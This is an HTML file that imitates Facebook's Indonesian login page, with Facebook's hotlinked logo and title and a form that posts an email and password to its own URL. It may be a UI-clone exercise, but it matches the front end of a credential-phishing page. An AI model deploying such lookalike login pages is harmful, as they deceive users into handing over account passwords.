<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Masuk atau Daftar</title>
    <link rel="stylesheet" href="style.css" />
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
  </head>
  <body>
    <div class="container">
      <div class="row">
        <div class="left">
          <img
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
            alt=""
          />
          <h2 class="desc">
            Facebook membantu Anda terhubung dan berbagi dengan orang-orang
            dalam kehidupan Anda.
          </h2>
        </div>
        <div class="right">
          <div class="card">
            <form method="POST">
              <input
                type="email"
                name="email"
                id="email"
                placeholder="Email atau Nomor Telepon"
                autofocus
              />
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Kata Sandi"
              />
              <button type="submit" class="login">Login</button>
            </form>
            <div class="forget-password">
              <a href="#" class="forget">Lupa Kata Sandi?</a>
            </div>
            <div class="divider"></div>
            <button class="register">Buat Akun Baru</button>
          </div>
          <div class="halaman">
            <a href="">Buat halaman</a>
            untuk selebriti, grup musik, atau bisnis.
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
